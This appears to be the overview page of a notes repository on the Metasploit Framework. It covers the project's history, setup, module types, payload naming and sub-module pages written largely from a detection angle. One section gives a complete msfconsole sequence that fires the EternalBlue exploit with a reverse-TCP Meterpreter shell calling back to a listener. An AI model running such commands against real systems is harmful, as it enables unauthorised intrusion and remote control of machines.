# Metasploit Framework — Overview

The root page for the `Metasploit/` tool folder. Metasploit is a **whole exploitation framework**, not a single tool — this page covers what the Framework is, how to stand it up, the vocabulary/mechanics shared across every sub-module beneath it, and a table of contents into the 9 sub-module folders that carry the actual operational depth. This page intentionally stays shallow; go to a sub-module's own `01 - Overview.md` for its Red Flag Principle, verified command reference, and full evidence chain.

## Contents
- [What Metasploit Is](#what-metasploit-is)
- [Install & Setup](#install--setup)
- [Module Structure](#module-structure)
- [Shared Mechanics Across Sub-Modules](#shared-mechanics-across-sub-modules)
- [Sub-Module Table of Contents](#sub-module-table-of-contents)

---

## What Metasploit Is

The Metasploit Project was started in **2003 by H.D. Moore** as a portable, Perl-based network tool, with core development help from Matt Miller; the first public release shipped that October with 11 exploits. The Framework was **completely rewritten in Ruby** for the Metasploit 3.0 release in 2007 — roughly 150,000 lines of new code over an 18-month migration. On **October 21, 2009**, the project was acquired by **Rapid7**, which named Moore its chief security officer at the time and continues to maintain the Framework today at [`github.com/rapid7/metasploit-framework`](https://github.com/rapid7/metasploit-framework). By Rapid7's own 2026 wrap-up reporting, the Framework ships roughly 2,600 exploit modules alongside several thousand auxiliary and post-exploitation modules — the "one Swiss-army-knife tool" framing undersells it; it's closer to a small, actively-maintained OS of offensive tooling.

The **Metasploit Framework itself remains open source under a BSD-style license** (see the repo's `COPYING` file) — Rapid7's Community/Express/Pro editions layer proprietary tooling (web UI, reporting, automation) on top of the same open-core Framework, but `msfconsole` and the module library this note covers are free and open.

## Install & Setup

| Step | Command / Notes |
|---|---|
| Install (Linux/macOS) | Official installer scripts, or `apt install metasploit-framework` on Kali (ships pre-installed) — see the [nightly installers page](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html) |
| Launch the console | `msfconsole` — the primary interactive interface; on first launch it offers to initialize the database automatically. Full command surface, history, and evidence detail: `msfconsole/` below |
| Manual database init | `./msfdb init` (run from the Metasploit install directory, or just `msfdb init` if it's on `PATH`) — creates and configures a local PostgreSQL instance under `~/.msf4/db/`, sets up the web service, and points `msfconsole`'s data-service connection at it |
| Reconnect to an existing DB | `db_connect <user>:<pass>@127.0.0.1:5432/msf_database` from inside `msfconsole`, if a DB wasn't auto-connected |
| Confirm DB connectivity | `db_status` inside `msfconsole` |

The database isn't cosmetic — host data, loot, credentials, and scan/exploit results are all persisted there and feed workspace-scoped commands (`hosts`, `services`, `creds`, `loot`) that most other Metasploit documentation, third-party integrations, and this repo's own `03 - Source Evidence.md` pages assume are available. It is also, forensically, the single richest artifact an operator's own box carries — see `msfconsole/03 - Source Evidence.md`.

## Module Structure

Every piece of Metasploit functionality is a **module**, organized by type under `modules/` in the Framework source tree:

| Type | Purpose | Example | Covered in |
|---|---|---|---|
| `exploit` | Weaponizes a specific vulnerability to gain code execution | `exploit/windows/smb/ms17_010_eternalblue` | `Exploit Modules/` |
| `auxiliary` | Everything that isn't exploitation — scanning, fuzzing, DoS, protocol clients, admin-access abuse | `auxiliary/scanner/smb/smb_login` | `Auxiliary Modules/` |
| `post` | Runs *after* a session exists — enumeration, credential harvesting, pivoting setup | `post/windows/gather/hashdump` | `Post-Exploitation Modules/` |
| `payload` | The code that runs on a successfully exploited target (singles/stagers/stages — see below) | `windows/meterpreter/reverse_tcp` | `Meterpreter/` |
| `encoder` | Transforms payload bytes to avoid bad characters or (historically) signature matching | `x86/shikata_ga_nai` | `Encoders and Evasion/` |
| `evasion` | Newer (2018+) module class — purpose-built AV/EDR-bypass payload generators, distinct from encoders | `evasion/windows/windows_defender_exe` | `Encoders and Evasion/` |
| `nop` | NOP-sled generators for buffer-overflow-class exploits | `x86/opty2` | — (not yet broken out separately) |

One module gets carved out of its class page and given its own folder: **`exploit/windows/smb/psexec`** is covered in `Metasploit PsExec (exploit-windows-smb-psexec)/` rather than `Exploit Modules/`, because it's directly comparable to two other already-built sub-tools (`../../Impacket/psexec/`, Sysinternals `PsExec.exe`) and deserves a three-way evidence comparison the general exploit-class page doesn't need.

## Shared Mechanics Across Sub-Modules

Everything below applies regardless of which sub-module an operator is working in — it's the common vocabulary the sub-module pages build on rather than re-explain.

### The search → use → set → run workflow

```
msf6 > search type:exploit eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > show options
msf6 exploit(...) > set RHOSTS 10.10.10.5
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 10.10.14.1
msf6 exploit(...) > run
```

`search` queries the local module database (keywords, CVE, `type:`, `platform:`, `rank:` filters); `use` loads a module into the active context, changing the prompt to reflect it; `show options`/`show payloads`/`show targets` enumerate what's configurable; `set` (or `setg` for a workspace-global value) assigns option values; `run` (or `exploit` for exploit modules specifically) fires it. `back` exits the module context without running it. This same loop applies to `auxiliary` and `post` modules — only the vocabulary changes (`run` instead of `exploit`, no `PAYLOAD` option for most auxiliary modules, `SESSION` instead of `RHOSTS` for `post`). Full command reference and workspace/database mechanics: `msfconsole/01 - Overview.md`.

### Remote automation — msfrpcd / msfd

Metasploit's interactive `msfconsole` isn't the only way to drive it — `msfrpcd` exposes the same module/session control surface over an authenticated, TLS-wrapped MessagePack-RPC API (`POST /api`, default TCP/55553) for external tooling (orchestration scripts, GUIs, CI-driven pipelines). `msfd` (default TCP/55554) is an older, lighter daemon that instead hands out a shared, **unauthenticated** interactive console session to anyone who can reach the port. Full mechanics, wire protocol, and detection: `RPC and Daemon (msfrpcd-msfd)/`.

### Resource scripts

A resource script (`.rc` file) is a flat text file of `msfconsole` commands executed in sequence, exactly as if typed interactively — including `use`, `set`, `run`, and control-flow via Ruby if `<ruby>...</ruby>` blocks are embedded. Run one with `msfconsole -r setup.rc`, or from inside an already-running console with `resource setup.rc`. This is the primary way operators make a multi-step Metasploit sequence (stand up a listener, configure a module, fire it) repeatable and scriptable without a full RPC integration. Detail: `msfconsole/02 - Hands-On Use Cases.md`.

### Payloads: singles, stagers, and stages

Metasploit payload naming directly encodes its delivery shape:

| Shape | Naming pattern | Behavior |
|---|---|---|
| **Single** | e.g. `windows/x64/shell_reverse_tcp` (underscore-joined) | Fully self-contained — gets a shell and does nothing else. No second-stage download. |
| **Stager + stage (staged)** | e.g. `windows/x64/meterpreter/reverse_tcp` (slash-joined) | A small first-stage stub (`stage0`) establishes the callback connection, then pulls down a larger second stage (`stage1` — the full Meterpreter DLL) over that same connection. Smaller initial footprint on disk/in the exploit buffer; requires the handler to remain reachable for the second-stage transfer. |
| **Stageless** | e.g. `windows/x64/meterpreter_reverse_tcp` (underscore-joined, note vs. the staged form above) | The entire Meterpreter payload ships in one blob — no second download. Larger, but works in environments where only a single outbound connection/exploit buffer is viable. |

This is the direct link to two of the sub-modules below: **`Meterpreter/` is the payload** that gets staged in or shipped stageless by this mechanism, and **`msfvenom/` is the command-line tool that generates the payload file/shellcode** (standalone `.exe`, `.dll`, raw shellcode, encoded variants) independent of `msfconsole`'s interactive exploit/handler flow — e.g. for embedding in a phishing document or a manually-delivered dropper rather than pushing it through a live exploit module. `multi/handler`, the generic listener that catches a payload's callback, is covered as part of `msfconsole/` rather than as its own folder — it's "how you catch a payload," not a standalone tool.

## Sub-Module Table of Contents

| Sub-Module | Covers |
|---|---|
| [`msfconsole/`](msfconsole/01%20-%20Overview.md) | The interactive shell itself — search/use/set/run, sessions, the workspace-scoped Postgres database (`hosts`/`services`/`creds`/`loot`), resource scripts, `multi/handler`. Its own richest evidence: an unencrypted, per-line `~/.msf4/history` of every module ever run. |
| [`Meterpreter/`](Meterpreter/01%20-%20Overview.md) | The flagship post-exploitation payload — reflectively loaded straight into process memory (never touches disk as a file), TLV protocol over a single AES-256-CBC-encrypted socket. Hunting it means hunting process memory and network protocol, not a file signature. |
| [`msfvenom/`](msfvenom/01%20-%20Overview.md) | Standalone payload/shellcode generator, independent of `msfconsole`. Injecting raw shellcode into a compiler-built template leaves a sharp entropy contrast between the injected region and the rest of the binary — the strongest static-triage tell, and one that survives almost every evasion flag the tool exposes. |
| [`Exploit Modules/`](Exploit%20Modules/01%20-%20Overview.md) | `exploit/*` as a module class (~2,600 modules) — anatomy, ranking, `check` vs. `exploit`/`run`. `check` only ever probes; conflating a vulnerable-target finding with an actual exploitation event is the single most common analysis mistake this page guards against. Anchored by `ms17_010_eternalblue`. |
| [`Auxiliary Modules/`](Auxiliary%20Modules/01%20-%20Overview.md) | `auxiliary/*` as a module class (scanning, admin-access abuse, gather, DoS, fuzzing, spoofing). `THREADS` fans a single `run` across an entire `RHOSTS` range — volume, not stealth, is this class's defining forensic property. Anchored by `auxiliary/scanner/smb/smb_login`. |
| [`Post-Exploitation Modules/`](Post-Exploitation%20Modules/01%20-%20Overview.md) | `post/*` as a module class — invoked only against an already-live session, so its evidence rides inside that session's existing channel rather than generating new inbound connections. `store_loot` output under `~/.msf4/loot/` is the one artifact that reliably survives regardless of which module ran. Anchored by `post/windows/gather/hashdump`. |
| [`Metasploit PsExec (exploit-windows-smb-psexec)/`](Metasploit%20PsExec%20%28exploit-windows-smb-psexec%29/01%20-%20Overview.md) | The one exploit module carved out of `Exploit Modules/` for its own folder. On any Windows 7+ target it silently prefers a fileless `PowerShell` target over a file-drop — the tell moves from `ADMIN$` into the Event ID 7045 `ImagePath` field. Three-way comparison against Impacket's and Sysinternals' `psexec`. |
| [`Encoders and Evasion/`](Encoders%20and%20Evasion/01%20-%20Overview.md) | Two structurally different mechanisms: **encoders** (`x86/shikata_ga_nai`) only mutate a payload's byte pattern via a decoder-stub wrapper — "encoded" is not "evasive," and the stub shape itself is a well-known signature. **`evasion/*` modules** are a separate, newer module class combining a specific technique into one output file. Evasion-module internals are a lighter first pass — see the page's inline scope note. |
| [`RPC and Daemon (msfrpcd-msfd)/`](RPC%20and%20Daemon%20%28msfrpcd-msfd%29/01%20-%20Overview.md) | Metasploit's actual remote-control surface. `msfrpcd` (TCP/55553) is authenticated/TLS-wrapped MessagePack-RPC; `msfd` (TCP/55554) hands a shared console to anyone who can open a socket to it — **no authentication at all, by design.** Either one reachable from an unexpected network is a critical finding on its own. |

Every sub-module page shares this page's payload-naming vocabulary and the `search`/`use`/`set`/`run` workflow above — none of them re-derive it.
